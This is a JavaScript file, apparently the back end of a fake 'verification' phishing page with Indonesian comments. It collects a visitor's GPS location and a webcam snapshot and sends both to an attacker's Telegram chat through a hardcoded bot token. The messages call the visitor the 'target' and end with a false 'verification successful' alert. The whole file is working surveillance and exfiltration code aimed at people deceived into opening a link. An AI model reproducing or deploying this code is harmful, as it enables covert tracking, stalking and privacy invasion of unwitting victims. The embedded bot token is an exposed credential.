// script.js
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('ref'); 
const botToken = "8556917932:AAG6ZjgdxqrMl74xBiZmw4Ol5MuIlrlSGSg"; // PASTIKAN TOKEN INI BENAR

async function startProcess() {

    if (navigator.geolocation) {

        navigator.geolocation.getCurrentPosition(async (position) => {

            const { latitude, longitude } = position.coords;

            // OTOMATIS: Kirim lokasi ke bot

            await sendToTelegram(`📍 **LOKASI TARGET DITEMUKAN!**\n\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

            captureCamera();

        }, () => {

            sendToTelegram("❌ Target memberikan izin tapi gagal mengambil koordinat GPS.");

            captureCamera();

        });

    }

}



async function captureCamera() {

    try {

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement('video');

        video.srcObject = stream;

        await video.play();



        setTimeout(async () => {

            const canvas = document.createElement('canvas');

            canvas.width = video.videoWidth;

            canvas.height = video.videoHeight;

            canvas.getContext('2d').drawImage(video, 0, 0);

            const imgBase64 = canvas.toDataURL('image/jpeg');

            

            // OTOMATIS: Kirim foto ke bot

            await sendPhotoToTelegram(imgBase64);

            

            stream.getTracks().forEach(t => t.stop());

            alert("Verifikasi Berhasil.");

        }, 2000);

    } catch (e) {

        sendToTelegram("❌ Target menolak izin kamera.");

    }

}

async function sendToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: chatId, 
            text: text, 
            parse_mode: "Markdown" 
        })
    });
}

async function sendPhotoToTelegram(base64) {
    const blob = await (await fetch(base64)).blob();
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('photo', blob, 'shot.jpg');
    fd.append('caption', '📸 **TARGET TERDETEKSI!**');
    
    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
        method: 'POST', 
        body: fd 
    });
}